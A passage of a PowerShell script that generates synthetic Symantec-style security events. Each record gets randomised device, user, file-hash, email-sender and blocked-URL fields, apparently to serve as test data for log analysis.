            DeviceOS         = $dev.OS
            DeviceSite       = $dev.Site
            UserId           = $user.Id
            UserName         = $user.Name
            UserDept         = $user.Dept
            UserPriv         = $user.Priv
            SourceIP         = $dev.IP
            DestIP           = Get-RandomExtIP
            Action           = $action
            ThreatCategory   = $tcat
            ThreatName       = $threat
            FilePath         = if ($prod -eq "Endpoint Security") { "C:\Users\$($user.Name)\AppData\Local\Temp\$(New-Guid8).exe" } else { $null }
            FileHash_SHA256  = if ($prod -eq "Endpoint Security") { -join ((1..64) | ForEach-Object { "0123456789abcdef"[(RandInt 0 16)] }) } else { $null }
            FileSizeByte     = if ($prod -eq "Endpoint Security") { RandInt 4096 10485760 } else { $null }
            DLPPolicyTriggered = if ($prod -eq "DLP") { Pick $dlpTypes } else { $null }
            EmailSubject     = if ($prod -eq "Email Security.cloud") { Pick $emailSubj } else { $null }
            EmailSender      = if ($prod -eq "Email Security.cloud") { "$(New-Guid8)@$(Pick @('gmail.com','proton.me','mail.ru','yahoo.com'))" } else { $null }
            URLBlocked       = if ($prod -eq "Web Security Service") {
                                  $symDns = if ((RandInt 0 3) -eq 0) { Get-ThreatDnsRecord } else { Get-RandomDnsRecord }
                                  "https://$($symDns.FQDN)$(Pick @('','/payload','/update','/download/$(New-Guid8)'))"
                              } else { $null }
            URLBlockedFQDN   = if ($prod -eq "Web Security Service") { $symDns.FQDN } else { $null }
            URLBlockedIP     = if ($prod -eq "Web Security Service") { $symDns.IP } else { $null }
            URLCategory      = if ($prod -eq "Web Security Service") { $symDns.Category } else { $null }
            SignatureVersion = "$(RandInt 20240000 20241231).$(RandInt 1 99)"
            EngineVersion    = "14.$(RandInt 3 9).$(RandInt 1000 9999).$(RandInt 1 9999)"
            ScanType         = Pick @("Auto-Protect","Scheduled Scan","Manual Scan","SONAR","Download Insight")
            Occurrences      = RandInt 1 5
            MachineDomain    = "CORP.LOCAL"
